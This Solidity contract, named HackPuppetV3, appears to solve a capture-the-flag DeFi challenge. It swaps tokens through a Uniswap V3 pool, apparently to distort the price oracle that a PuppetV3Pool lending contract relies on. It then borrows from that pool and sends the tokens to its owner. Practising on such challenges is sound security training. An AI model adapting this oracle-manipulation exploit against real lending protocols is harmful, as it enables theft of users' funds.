// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import { PuppetV3Pool } from "./PuppetV3Pool.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract HackPuppetV3 is IUniswapV3SwapCallback {
    IWETH weth;
    IERC20 token;
    IUniswapV3Pool pool;
    PuppetV3Pool lendingPool;
    address owner;

    constructor(
        IWETH _weth,
        IERC20 _token,
        IUniswapV3Pool _pool,
        PuppetV3Pool  _lendingPool
    ) {
        owner = msg.sender;
        weth = _weth;
        token = _token;
        pool = _pool;
        lendingPool = _lendingPool;
    }

    function swap(int256 amount, uint160 sqrt) public {
        bytes memory encoded = abi.encode(address(token), address(pool));
        pool.swap(address(this), false, amount, sqrt, encoded);
    }

    function borrowAndTransfer(uint256 borrow) public {
        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
        lendingPool.borrow(borrow);
        token.transfer(owner, token.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        (address _token, address _pool) = abi.decode(data, (address, address));
        IERC20(_token).transfer(_pool, uint256(amount1Delta));
    }

    fallback() external payable {}
}
